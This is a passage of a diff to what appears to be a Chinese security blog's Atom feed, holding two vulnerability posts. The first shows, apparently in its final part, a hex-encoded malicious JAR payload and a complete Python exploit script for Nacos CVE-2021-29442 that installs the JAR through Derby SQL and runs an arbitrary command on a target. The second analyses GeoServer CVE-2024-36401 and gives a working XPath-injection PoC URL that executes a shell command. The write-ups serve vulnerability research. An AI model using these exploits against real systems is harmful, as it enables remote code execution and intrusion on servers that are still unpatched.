3dd3cd211d8bf45869d6810a92670ec55de49c97d3883a00a47770c6c5b93da663a130d72dd03d7cec558c1f8c6c855903c817ddbaea218bb5a855731ca7e543cbced9f5dd09c51ddb397cff695787632718e255c6bee0127f229731584a98c3202c777cc11b80a8f93b4114eaa75a8be8bf25c02477610c9f3a83825da0877d83215e786ab29a603a8f749cc0c48cd96cb5784bf7b0fe1f7500711a9e8c8edabad7a45bb2dc422c53e5610d8315d65db4bb24d1d5bdd48bf5c17036d3a972bbfae185b015f40c7d7f117406072833abf1d9f98ea317963d096b912c6ff34d410fd7b650d6af9199d3033bd62f6882d844347a022ed2b6ec52b06ffd5363db37a160d8ae21cac4eea5d37ce6e75058eb25a3af580535ee2e0561f5776b3128b20eff4d11cb74d59d53b5a0a04d920d1bed4ed4bb810c7b6d03073758c935baf250bb477522df5db74e96d86b27db143eb2b0462579116fb950a558eb43191630ec7f48d8842107bd1afb65fccf47bb97c1e218186aad439be3ccd928b729b807a0f2c7be9104d0a746102f7fd3faf7b35a3133bc6984eb25faac923575201dd2b4904bd5d6f0f3a4d6e1a4cf828b102ca305d1381d892fba70abcf11792ea816ba2708f90d8d3648ae96208949b1e78ad789fe3306fde7e8d82d3f19dc9ee8e1d34019ee7aa2cef289510763b8996bbacc0b65cd314b272adf4e8389902b1d29a19699fc4b5baf2a8823ca080bfc26d1a7768cce5674afc6ca75a4e76fa4289f3d6e97e72ddee3def345d42417e5905df226fc4fdaf2e87fa09b12fcb76bb82bc4945de4c1e2490bdf4c8c3977ef7533ff9d2977ff4b52f5e7af8b77ef4be8f5cfac0136b979e7ae46f3efbce8d13dede84ad71dce4c4a5cf3c7de9f187364e68db6ca9236a574f9cf8f153e77ff495775dfafcef6d9c488b9cb0eea8726d69e344b25ae1fb0ddc61d74ab5d3bd8e789aef548bb8879d76144549604b52849570971632ede164dcbd92090f5fed65b2ffc77e9318706cfd0b66725c6694d68f729a702336acb53cba52c6e14995a39d74d693f7b9d37d17c33be2f96a245d2a579bc186cec6e59d1d4d2ca2614c452f33c83342aecbf70a569d3151694a018324a50deeba90f185fbcd54a5c41b2b9c9dad485aadae9db25aad469fcf911fc5cc1a5bd46cb59bad93762eaa15ed43eb44ab350eeb698745eb1d548b0e83dfdd4a32f558d0ceb81cbd9a2124392c79bee7ed65f8a45ef2f9cb168fae1c4b59584b1afbbbd6a43b9e71e523bcb39c4e324126974efb12c57423c7588538cbeb44ae5a18f03ac117e825c446b26c088d82a351c3686af6cc83acd753efc6999654cfa45c7ddee848eb07b990c65de63b56c12195f5417dd092d21687559f55ccc4b964dbc11bba93b4dec08aacabd29652ed9e64cac7bb3aa661d76a1b9ca7e370b547762eec4ce43392542e3b4b92aed6aab992e3725e6f70e55c7667a8de3426dcc19ec63ee8b95a9962df9dafa6997025c83b12fa21670ee5fa9ce84c0d2cdd9ee4f13818bed9ce9be3e19c6f68ae18b4fca0eba9e8fb11073bb21bcc2d9faea2cb44b3d65c8f8fe624679e49ebd920d3d31b4c39879989374ded86ae1de6f950451a4de2f6fc38970cc5d3423fe7c9a5278c2fa2cf5bc4ba2111e0188f2dd1b2b4d2ad762ac0767551be36b6753dd1413b6030969a3d369befb79ac96cdfd5ea1732a22bdeb5eaaa117f81b5e68556564ab803c94c2a921c3106c790e99ac3e5be4bef6d8ec29348c8574d6473a32857add61ae5aca198119c9c29c20a567dce198e07c285d628354c16a2a3e4b815b56a4b1c5fd575bde22496f4c5a45c26d748755342952f6ab3358f68726ab3c14ac1c862f2684afd503f3f1aebeacd5abd660d194c4262c8e7c5685aa76fb5c2662d33aeb546e548256dd5657ace72c1ad37051bbd4c8129c4f26ec9dd1a5a45ab399eb479a2856e349be2f95e40cc25b3294ba310286702e3bcb1298575bc20d81db9542ddcb059c44cb4cab6ea21b3c3d4a8a41ab171d46ab6d9bdb56ed7658a562286aaab66d1c610317cb033b2391953373b1907359951d52f8e6ad660323f19b586dd51d7d0891a0c3ecdc8845889256bed418b1b97c3f66ebf6d1d1807d54ec85c081799b6a5558839cb2ebf3691cb37fca64a66d01ff2a2ae6bb145dcc550a420754d8e8cabe42b7aab1a9f10700f879d9e476ad6f5ed8ebb8ede1b7af2119da8cddabbd5d8d0604da13318175f9f7893c96ec890614362a4957697dbf65ad2c0c75dc96874e20f14dcc58ccd148fb8a3969138c9ba1923dbcb6b7d9a50ba3a341be369a6dfe9a698c1209cd16bb33aa7cfede4ab7c2dea1e9beb7d2f67b0d73cda46dfd1c1137a37e8c95afd1e3ea5b7067dc35a8fd105aa52b42334745d7b6ea2ab956aa3b4d73de944fb6e8356140af981d126e5fa15bfab38e61aeca89a2e798a4e67216a690cda8da69b290653b66625e18ba19cc9e228d86d85f8b4c56b353aba65a6d7ca263d1556ec44ddfd9edfdf4ee57a834466d01cb54dae40bfd50f8c5d098d212a88457e981c0ffbe142a75cb4a5acda70c39fab1be33ea783a9e4189fb522b4da064c8fd9b01898f838ad4763e126564331d5b0e4cd9e64d3384ed65db1b4d0363952c37ebfa2af3a3c523c584a6b269151d092c6437f8b6bf9b54d9b765cd504db6d5334eccd8f5b42928f96274d76c40fb4d566ac9eeb564c216f6ba2cd85bce690a5d1b598c70643a0a7eb5b6df17cacced8b5bd49d1583066daedb8d81bea8dc158a259613a234d2d9e2aa6e37aa669e0b8762c2c35ea498ba16028d8b996682d72be547e9861d9a02fd6ad361b8184cf66c99843be712f52cf14b866295bed8ed1d3c9a1a5daca70ac2f961cc4231eeda46d685aaafe88296c6126558ecb5983b942c367ee248ba2bb92ce65874dbe147634728d48d736ead8537dcfa89cb696594c3b863457ea67c352c5c54f9c19ad2e3fb257f2b5788d2bb983652155d6386cf6e0286b1bdb07a996c6ef2b34734583afcb18db8170b1611d3b6cbeb0cfec6627bd52d1edca3042d1d767a4b4ad35e0fc6ebba93a6af90b311dc24674a70a6ea3c5e1d775a21531ce96fa432bcf35dc29f3d8d5e80bd952b0271af54d8f60b4657382c714755475f64ccc960a0a967edaadcf7903a18ad8ac277b099faec3996a16bd771c1d6b136db3b651d69a6cc9812dd3f4e90d63b1684efb73065fdee8aa693526e7185f71c29a44588c3a52565b2d2108922dee6f69c2a346a1cf323d5ba51e29f92bb16a91e1acb57e598847c594d08a6bb501c630ea94bc4d7bdf15776bb51e578dad787549670d77d5e260cc073429fb2861311a2cd158d124d8c3d1722e3a497b46966cad9419e65c03ab3d1c4ec46d91eca4ef8aa4b54cb9500e4e6ae96adb5689f42cdd5abd970ee842038c18266f0a17fd6e0de377d4ca7a6f72ccb37e8bc88d38bf35624e27cdc3122b960689522ad632b83cbeba4b6a46729554b1eff17433094bcf6e4f547c6289e96a9961a15808333a833b24dadd782c0e4871a3de254d3af19661cc706d5b2b1e0ae8cb916ac269718dc65a67b0940c25e38d91d39d4e0b74abb4f8f98854f00e2dbe76a95436175d52ad94d2e9ed255fae511b5bfcb672a3537198ca83ac6762880ee261c6e810f47693bd91cb79bb299f30ce35b565b318d00c9c23612c682b398ed11b8b5a67a6c6f8a3795bdd9d8f064a3a51cf33d92cef993492414b793276e453a6493d3b3488ad3413c88dfbbe9a9f31d91a4225cd07d2017c5d77fa194b6a6888982baebabfa1490deb0521e90f5a4b78bc499a8500da6b101dfbc4b8c61ef7641a1e73181348c2a4659271aee1601263a613b7e85d515724cc56ab950a9be84f9a99b126a68b7bc5b8b367cc0792c64eba1cb0baf9502ae666cb098f94607aa1c2081348b6d51ef8b86a235f3536adcd80bf9ecbb1865adb35b2fab29230f40c32ce6cb555cb8443ac596b098dadba98575373e2aed637714396f36a5aad54c01b8c77582f3b4a891ebf33d1c9fa6af960466bf2764c6367636c157b6db3a6d5a88f63995cd1149d341b423ee195dc669375c2dbc2edbaa3611be43d4ebd3b95d6da2597bd221a4b11ffc0e24dd9fbe641bc1eae177d9e58cf90b6c59259e748db0e729db031a0f71413c1842f1fe56a7d5730a8f76786b1713ec0845c8596ddedee962d23deac89548625472d62d2974a75aec2164437e7174c5cd71632a6ec3e9b33d4e5ed5dfd44c3981d5ed1df30a74d7ed1ca397b5e7b65d01113d16e3b6ef44cbaa1629b4de8ca8648b233197306439fb18762ecc0acf5f3daaad06f26069d468ae94a4c34820ef6942cf54a273910c78981ad31642256b619771bcd465db0de098e9cc9b2d51b1cf6dcba71232556c38df0a0c08f6a9e7eb99d30c52a3153a99228c51c5eab2e5bb2c6229e28e243eb0a47c2d198b19e32c76229bbb63c6a69275a4db9512d6a930ec3d86628c59864558c062dd54c386aacf1439b373611caa1386bd50f4d65c1d0ef68b994a1d88b84ab7eab869bb4ad7e7dd334741bb989dd8c87bd9639c7f679b7cfdfee97fb496b23c90a76739fb1388ae648253cc9189ae1d8c0c0a4b52d51eb48e72639736b1cd68db3d17124c906aa39ad635419746bfa9ca7ea70a8e01de441bcc0432af815f8b082645584254505c9a948899455842315157c167e53055f86dfc5979d3d0a4f5bbdbb0b1dbbde2b52b38a162d9c4ddba20a7e08df55912a8c09dc4c8b696c1ddf469cf8be52153afd76392674e80b534750911a2d7d2c4ddf5d55f0a7f05db9465617efd41138724d554d451aa4a920bc8ab4506cd2261d7c0b4b4a6cbbcc0ae559d54e45baa447e068aad32ab192a755e4ca65eecaa040441591a864ea18be1de2cb259fe58a6cb7ebda596fba6df7ec3d28f6099c28bf29d222d7156b24fa6da9dee2b60d489dd057910119aac8089786118c55644c262af2166afeb7e223fc3e5c54c137e09b28f59e652e54f2aa7e0579ab8abc0dcea9c8dbc93bf05d56451e22efdce596e9cbb98abc8bbc5b45de431edee55ff45367486b9f2af81afc1ebeb6b3e5b2a3dbe5eba8330aed19e04be7d64b2475e65fa21fd141af4682e23ca222ef25efa3dabe1f69c5d7a055910f900faac887c8afa017c987091c13fbedd3adba583aed74243d16937b5ab652915f25932bc52fb9daa3221f21ef98a9799a02e3f456518ca2cfbd55ef5a9ace2170cb6b96a550d0d7aa4751653ebac5e3d52a5194e8632af271f20915f935f24915f975f22915fc397c5f411e5591c7c8a709dcfada051d15f90ce9a8c8e3e43754e409d25391cf92df4400be4e9184c089d72b91a8c89314e637bd46117f0b146881407407ef83bb2bc60456ae7404244e60a50e9a59736da927d01e74a64e4fc921bdb7bcd30a6747f2d264b083e4c657ab1ded2e648c1149aded1a2cca1e13eaed2b95c1ebf6e826a0e8d2271e5739ba57fd947e9da86f6b766c57d17c4b635ae9aab122237f1a983f450bb70b6df961f777942b7531b4c0b402277fcfc02c484b643b97c7f39f90e47a7dae5de2e44af052931b27396479649708d845bf5becea4019aaf4aadcfaa683aaef9263ab0c368fd17d95da5bd53c5cf1e8950f1ebb528efa5a5eb3a23b2e2975b63ef9dcb893ed765e910d7aa0d417040cfdad1d62b795b6bf7a1cdc927f3bb5f2d8986974f2753e916d7f2e6873c3405bc4ada0c46ded1cd3d840cdaa94eb422a1ff3e0d03451f0acc095b7c075ff1e8b5c5b4fdcab6abb5dda3c40539e1c7f75f94bd4c2a982fc7d61c0f27d2e5aa1900aec6430138b16b2a7755c02f63d1cf48b56600f5fb54bd39a3d2b4e63f7e4a957e7b2f3bb96fad48e3e5787a70ad24aabac87d491f95218ddb3e7979205b13ee1e4b00850a2c0de0151e908d380d8876ed832ff22fdba90b902259a8d76d4fae9d0c214413225f25f1c0a75fac14981cf810025d82f75b67338b5befcb5e2865729b3a3bd76a060d6b5fe3a48bbba507f005924fb5d4e284d91ba720db0e827d4ddd6ba06364b18fb2ccdc31496f43cd2e230d9d02f9aa21c2f7b55b59765d389225be5e076e8c059a0ff0ec13ee8810004447cb2c31cb600f67f15c8cadc26ccaf2c3c8d8f7320e17519ef38044a50411f5baa29290c608877428f283336eb78a763f32b8b57a62fc95d87764c9d8709bc459e8ac719a4a2534dd84bc7962fc2527e45711e945773b86e0787e51987b7e16f017bde8e3f3cb8cec4f81ef25ac4bb65f53cec5bdd84e5b0e619d84f20b2f60ca8083c0a3761e300016675fd3c1cdc58585d572f6cc2a17397fffa1c2c84bf825c16408f121dc63b5dff0e541de0183edd885653c309380e77c34d701a6e46ba5bc10cb7c9b2ad22c5dda08077c2bbb075020ec2bbb1358f734ec17be0615972cb4cf24766ba4cc7de8badf761cf7158b88ccbce2be0fd0af880023e08f0129c702ae043d45a782a476ea8e1dc0ff07e10bbc617e148fe3cac8457ae5bb9fe021c7d1e8ee15f84306b1b0bea85672d8bf396a5a34b47179f240ef5c2d125c38642add8841b566edc04f5a3f0b5f517e129b562e5f805b869e5667ab9052fcfc3ad1b4ab572136e7b064e10d8d8a7de3733db43b48576db58562bd5cb9b70fb36fd7ef5fe6d7a955a35a38fd016a53fa0deaf3e80f4ccfa0b707c7d13eed88437acdc29cbb05fb3fe0c9c9c83eccea1bb760f9dbbfcd4b9cb6f3d07432afcdd2f4047becbb4a756ee41dac7e0d8ceae55797a40ee5ad150bdd6f0f2ffb9f87b96c8b9579e3d078736162ec27a5ebd701e4e3fa7791add7123be8d34b741222018a650790342e54e84ca5d088ebbc1890ecec13d182babe8620d9c8335780a23e51b089f6f830efe02a92e81117e8c80fb2942e96fc1426e062b59031bb90fecc407f792029c2145b88bd4c0852b3af06dc64986e0964157c160388741fdab08b503b8c283f011f82846e710c3fb63d8b78cab7f1cff7f1425d3133d7c027e0d14c861193e09bf8eb2238866905492de0ca6c748093e850e9c431dd91988b7003ba5da026c140e5e4685155b803da680c7f04a10eaafc0fd0af8b4023e83307e05b4f2006dff0cccd87e198eff3dccbd047373ebab727b91a27cbf1cd14a5c8e87063c0ebf21e78027f087ef9dd3e8263ce6031a8fef25910ba045173308e3fd1ad97b3a661d9dafdf04c3261823e7a08cc1bd09a60b60be00968dc515eb8a6de9eb60cfcfaf6c24f30b5f857b93f9457add84331b4bea25cc02bfa45e5a4792b3f979f52292cc5f80fb9046bdf82c6d6cc2fdcf837d1a4494fde2c6e2dad328dc514cac772212eec214f46e70a0f814111b3444c18fe3010cf3207a2784940cd2e6913a86d4093040125b29c8401abd90c1f939f44041f66c02d53420fd93f0394c6731c4cae7e1b750f909febe803e572087376f79113d32f5226d518f115cf7613915cde1ea6f872fc297502eea330d2cfc1c8ecafef86d068d7e19de048bb2031f9b76d2744314f03b2fcbe91c5ff6a7399a1cc32515c8a0bbaa599b06cb26381f8585af68565c0b53b39e4d2ec8c65b4b5e0077f61cf818cd8a474e4c5efca349e902f8361669da522f9e073fb53af20a64352bc1190bef8c857a691342321b9a910f631869686a944d7b1a010e28f62134c06128e2580347cb185a1c9abd822ea842186a68dc3aee784dd99c7e947d0303ec9f60f82d20c569781a0db488746f80afc057d1a86be092cd394f75dc366777664eda9a9af37df20e347fb88086fa079cb3b50b1dc61fbe1fcf76b4bf433ed45a819d1660d6a9fe0bb2fe0b54ff6986562f6e42f849b84dbd7814b58e4c8dbb2627a2c5852fd31474f92fe6bf2c6f9d5736a43622aa83db6217b7a01eaa2fc07db8b003db3edc9bb754be1d51f24f6113d54351b6950a6c2b1580f3982be690d719d934f3c8d1229b6601f96a64d32cca2a9f80f9cbc84eb105950b0af0ca41ff0cf2b9ed65a4ba6208252d52cc60338f6b5384b656980b100d6b5662334f2f6140c531708d5387af4ee36b03ff9e0eaf249036b2b6929c47dae7218594049b679184a1997a25bd93c9fab51c64e55665cc4c13f471d9046fc1eb5bb1f7ede8ed7760783d84467aa76c2c132ab00427e10f30b4088edc2bb7e670fc247c5d4e816b68dc67111f94730b9e938f3f8fc82783b9d9cce7b7673e3fc3099e5d9a349ede26636601fe50ce6b3c86e437e09b33a47c0ffba96c672f420677f36cf822e4f27876c9472e4221bf761e1e608e10f803e5c6827c50f9e5bc65f1d37048a35e983f8ab879e3b9cb3f4523bee9e96d78dc2ae3ee1174c27be1084a711cde8f7efb206e3a1fc293de87656dcf4e57847f86c985665c0b7c0b5e40e98f20d58bf04728d9714c52ff1cb7a8799c7b0bfc31d22da03daf877f81609a02e26698a380c0dcb1a180ef28e05f2ae04f688cc1cfe006b2e36ca6a485ba99ae59bcd3f83ab28a1bf39b236ba8cf836b98a3d92bc7bd8332c1c750c08f63987f4216f7c47412fc193a02e4d6bf42f3e3811829be07ff1a67eec4de9fc3f767cbbd88f328f64ee1127744d65e00f51adaaac8acd375d79f6630c6ca9173977f72114a79cd79e09e938f6447d1a5a5196ceec267c0dd7011f7c37d807687cfa0111e478a27e006dc966ec68de936cccc5b103a84c6a712cde3a812d3c90f64c94f6d4b7e6a26f922a69d2fc800dbda59a73d5bc03900f33fa3a6fd373105fc5be5b67a2564f0c36d6b3ab18f1ece0fae6a689cd000c18479f5c9f98bb270c7a694f0ef66821cc4a30715646bc76d202a1fc783ca0fe12fa7dce78ecb675780efacfe21d81f85e555dcfc70dba1a6dc58201b8bea054cdf8b2f4255bdf40214d75e0417cdd9950dc5bc457954a9563cfb249c562b8e2a7133aea2d56b8f827af6587ff6313820b73716cfc1bef72831c1fd299eb1d44b9a3539d8cf60ffe52fe04e8b0ccb1b4be72e3f4617525d84067553f339f522ddaba7721d572f124c09f73fbda1904f68b839b7ce431b6956f7ea46a54ea24146a8f013b2077804f4d731b0f959f8b4f1680fb8ed5d8f1bdf0d98136fc2ac7812f3e03d98097598e0efc5149fc19cfa469cf7203e57e019dc662e22cfe791ebb398639fc394f23c9e92be8181f74d44f2b7103f2fe06a7f84ab7d1bf7e13fc6997f8294df45aa3f939d33410418f13fcdd44a5cc502ff1efe0a9134c1df7f80bfc6eb9710119f84ff88ade7b75be89a6d5c7d67e64edafa4f78a29c935b3f9233faf52821d57401f5d984bfc153c4226af5553c739e438850b469e1e0411782ed1550e255013fc1ebcfe10605fc67b2f6122cceedc7d3d94ff71f4829e0bf1cf4e165076a683653c27fdd7efb3a292f0db0ef2274309b7571fba62f2f57de24bf8fe43fc09ebf9561fadffe11504b07080ac6eb97031d0000bf2e0000504b03040a00000800004160f258000000000000000000000000090000004d4554412d494e462f504b010214001400080808004160f2587f64045e38000000370000001400040000000000000000000000000000004d4554412d494e462f4d414e49464553542e4d46feca0000504b01020a000a00000800004160f25800000000000000000000000004000000000000000000000000007e0000006f72672f504b01020a000a00000800004160f2580000000000000000000000000d00000000000000000000000000a00000006f72672f61706163686567762f504b010214001400080808004160f2580ac6eb97031d0000bf2e00002100000000000000000000000000cb0000006f72672f61706163686567762f5369676e61747572655574696c732e636c617373504b01020a000a00000800004160f25800000000000000000000000009000000000000000000000000001d1e00004d4554412d494e462f504b0506000000000500050039010000441e00000000'
+    removal_url = urljoin(target, '/nacos/v1/cs/ops/data/removal')
+    derby_url = urljoin(target, '/nacos/v1/cs/ops/derby')
+    for i in range(0, sys.maxsize):
+        id = ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', 8))
+        post_sql = f&quot;&quot;&quot;
+        CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE('values CAST (X''{payload}'' AS BLOB)', '/tmp/evil', ',' ,'&quot;', 'UTF-8', '/tmp/evil.jar')
+        CALL sqlj.install_jar('/tmp/evil.jar', 'NACOS.{id}', 0)
+        CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'NACOS.{id}')
+        CREATE FUNCTION S_EXAMPLE_{id}( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'test.poc.Example.exec'
+        &quot;&quot;&quot;
+        get_sql = f&quot;select * from (select count(*) as b, S_EXAMPLE_{id}('{command}') as a from config_info) tmp /*ROWS FETCH NEXT*/&quot;
+        files = {'file': post_sql}
+        post_resp = requests.post(url=removal_url, files=files)
+        post_json = post_resp.json()
+        if post_json.get('message', None) is None and post_json.get('data', None) is not None:
+            print(post_resp.text)
+            get_resp = requests.get(url=derby_url, params={'sql': get_sql})
+            print(get_resp.text)
+            break
+
+
+def main():
+    parser = argparse.ArgumentParser(description='Exploit script for Nacos CVE-2021-29442')
+    parser.add_argument('-t', '--target', required=True, help='Target URL')
+    parser.add_argument('-c', '--command', required=True, help='Command to execute')
+    
+    args = parser.parse_args()
+    
+    exploit(args.target, args.command)
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+<h2 id="九-参考链接">九、参考链接</h2>
+<ol>
+<li>https://mp.weixin.qq.com/s/JF5t06jterQ5Czb7rR-EMQ</li>
+<li>https://github.com/Conan924/NacosExploit/tree/main</li>
+</ol>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2024-36401 GeoServer 代码执行漏洞]]></title>
+        <id>https://mtcz91.github.io/post/cve-2024-36401-geoserver-dai-ma-zhi-xing-lou-dong/</id>
+        <link href="https://mtcz91.github.io/post/cve-2024-36401-geoserver-dai-ma-zhi-xing-lou-dong/">
+        </link>
+        <updated>2024-07-08T14:09:47.000Z</updated>
+        <summary type="html"><![CDATA[<p><strong>本文首发于 t00ls</strong></p>
+<h2 id="漏洞描述">漏洞描述</h2>
+<p>​	GeoServer 是一个地理空间数据开源服务器软件，在调用GeoTools库 API 解析特性类型的属性/属性名称时，若将攻击者恶意构造的属性名传递给commons-jxpath组件并作为XPath表达式解析时，可造成任意代码执行。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p><strong>本文首发于 t00ls</strong></p>
+<h2 id="漏洞描述">漏洞描述</h2>
+<p>​	GeoServer 是一个地理空间数据开源服务器软件，在调用GeoTools库 API 解析特性类型的属性/属性名称时，若将攻击者恶意构造的属性名传递给commons-jxpath组件并作为XPath表达式解析时，可造成任意代码执行。</p>
+<!-- more -->
+<h2 id="影响范围">影响范围</h2>
+<p>​	GeoServer &lt; 2.23.6</p>
+<p>​	2.24.0 &lt;= GeoServer &lt; 2.24.4</p>
+<p>​	2.25.0 &lt;= GeoServer &lt; 2.25.2</p>
+<h2 id="环境构建">环境构建</h2>
+<p>​	使用 vulhub 的 docker-compose.yml 构建，其中 5005 为远程调试端口</p>
+<pre><code class="language-yaml">version: '3'
+services:
+ web:
+   image: vulhub/geoserver:2.23.2
+   ports:
+    - &quot;8080:8080&quot;
+    - &quot;5005:5005&quot;
+</code></pre>
+<p>​	在上述 docker-compose.yml 目录下通过命令启动漏洞容器:</p>
+<pre><code>docker-compose up -d 
+</code></pre>
+<p>​	将容器中 geoserver 应用目录复制到本地：</p>
+<pre><code class="language-cmd">docker cp -a 容器ID:/usr/local/geoserver e:/geoserver-test
+</code></pre>
+<p>​	在 e:/geoserver-test/geoserver 目录右键以 IDEA project 打开，在 IDEA 中geoserver\webapps\geoserver\WEB-INF\lib 目录上右键 Add as Library... ，name为 lib，点击 OK。</p>
+<p>​	在 IDEA 的运行配置里选择 Remote 调试，默认5005端口，选择 Use module classpath 为 geoserver 后点击 OK。</p>
+<figure data-type="image" tabindex="1"><img src="https://mtcz91.github.io/post-images/1720447976381.png" alt="" loading="lazy"></figure>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>​	官方的漏洞通告里列出了漏洞可能存在的位置，WFS的GetFeature、GetPropertyValue、WMS的GetMap、GetFeatureInfo、GetLegendGraphic、WPS的Execute等。</p>
+<p>​	以 org.geoserver.wfs.GetPropertyValue 为例进行分析，这时需要找到可以触发进入该类的请求，通过<a href="https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html">官网文档</a>找到如下请求方式。</p>
+<p>​	GET请求：</p>
+<pre><code class="language-rul">http://example.com/geoserver/wfs?
+  service=wfs&amp;
+  version=2.0.0&amp;
+  request=GetPropertyValue&amp;
+  typeNames=topp:states&amp;
+  valueReference=the_geom
+</code></pre>
+<p>​	POST 请求：</p>
+<pre><code>&lt;wfs:GetPropertyValue service='WFS' version='2.0.0'
+ xmlns:topp='http://www.openplans.org/topp'
+ xmlns:fes='http://www.opengis.net/fes/2.0'
+ xmlns:wfs='http://www.opengis.net/wfs/2.0'
+ valueReference='the_geom'&gt;
+  &lt;wfs:Query typeNames='topp:states'/&gt;
+&lt;/wfs:GetPropertyValue&gt;
+</code></pre>
+<p>​	本次分析过程使用如下 GET 请求：</p>
+<pre><code>http://127.0.0.1:8080/geoserver/wfs?service=WFS&amp;version=2.0.0&amp;request=GetPropertyValue&amp;typeNames=sf:archsites&amp;valueReference=t00lssss
+</code></pre>
+<p>​	在 org.geoserver.wfs.GetPropertyValue 中发现解析属性名称的 propertyNameNoIndexes.evaluate() 方法，在此处下断点：</p>
+<figure data-type="image" tabindex="2"><img src="https://mtcz91.github.io/post-images/1720448061019.png" alt="" loading="lazy"></figure>
+<p>​	跟进 evaluate() 方法，最终执行到 accessor.get()，可以看到 attPath 是可以被控制的参数值，即 valueReference 的值。</p>
+<figure data-type="image" tabindex="3"><img src="https://mtcz91.github.io/post-images/1720448068795.png" alt="" loading="lazy"></figure>
+<p>​		继续向下执行可以跟进到<code>org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.get()</code>  ，属于 GeoTools 的 CVE-2024-36404 <a href="https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w">漏洞通告</a>中7 个可能触发xpath表达式注入的方法之一 ：</p>
+<pre><code>org.geotools.appschema.util.XmlXpathUtilites.getXPathValues(NamespaceSupport, String, Document)  
+org.geotools.appschema.util.XmlXpathUtilites.countXPathNodes(NamespaceSupport, String, Document)  
+org.geotools.appschema.util.XmlXpathUtilites.getSingleXPathValue(NamespaceSupport, String, Document)  
+org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.get(Object, String, Class&lt;T\&gt;)  
+org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.set(Object, String, Object, Class)  
+org.geotools.data.complex.expression.MapPropertyAccessorFactory.new PropertyAccessor() {...}.get(Object, String, Class&lt;T\&gt;)  
+org.geotools.xsd.StreamingParser.StreamingParser(Configuration, InputStream, String)
+</code></pre>
+<p>​	可以看到 t00lssss 值被传递给 xpath 参数：</p>
+<figure data-type="image" tabindex="4"><img src="https://mtcz91.github.io/post-images/1720448087444.png" alt="" loading="lazy"></figure>
+<p>​	跟进 context.iteratePointers() 方法：</p>
+<figure data-type="image" tabindex="5"><img src="https://mtcz91.github.io/post-images/1720448094169.png" alt="" loading="lazy"></figure>
+<p>​	跟进 this.compileExpression() 方法，这里对 xpath 进行编译：</p>
+<figure data-type="image" tabindex="6"><img src="https://mtcz91.github.io/post-images/1720448104630.png" alt="" loading="lazy"></figure>
+<p>​	继续执行，然后进入 <code>org.apache.commons.jxpath.ri.compiler.Expression</code>类的<code>iteratePointers</code>方法：</p>
+<figure data-type="image" tabindex="7"><img src="https://mtcz91.github.io/post-images/1720448135144.png" alt="" loading="lazy"></figure>
+<p>​	此时，会根据返回的编译对象不同，进入相应的 compute 方法：</p>
+<figure data-type="image" tabindex="8"><img src="https://mtcz91.github.io/post-images/1720448142362.png" alt="" loading="lazy"></figure>
+<p>​	当前 valueReference 值为 t00lssss，进入了 <code>org.apache.commons.jxpath.ri.compiler.LocationPath</code>的 compute 方法</p>
+<figure data-type="image" tabindex="9"><img src="https://mtcz91.github.io/post-images/1720448151045.png" alt="" loading="lazy"></figure>
+<p>​	如果传入的 valueReference 值为调用 java 方法的表达式，则跳转到<code>org.apache.commons.jxpath.ri.compiler.ExtensionFunction</code>的 compute 方法，再调用 computeValue() 方法，解析表达式，造成任意代码执行，详见漏洞 POC。</p>
+<h2 id="漏洞-poc">漏洞 POC</h2>
+<p>​	使用下面POC 验证漏洞：</p>
+<pre><code>http://127.0.0.1:8080/geoserver/wfs?service=WFS&amp;version=2.0.0&amp;request=GetPropertyValue&amp;typeNames=sf:archsites&amp;valueReference=exec(java.lang.Runtime.getRuntime(),'touch /tmp/t00ls')
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://mtcz91.github.io/post-images/1720448165796.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://mtcz91.github.io/post-images/1720448174389.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://mtcz91.github.io/post-images/1720448183239.png" alt="" loading="lazy"></figure>
+<h2 id="参考链接">参考链接</h2>
+<ul>
+<li>https://avd.aliyun.com/detail?id=AVD-2024-36401</li>
+<li>https://tttang.com/archive/1771/</li>
+<li>https://forum.butian.net/share/3129</li>
+</ul>
+]]></content>
+    </entry>
+</feed>
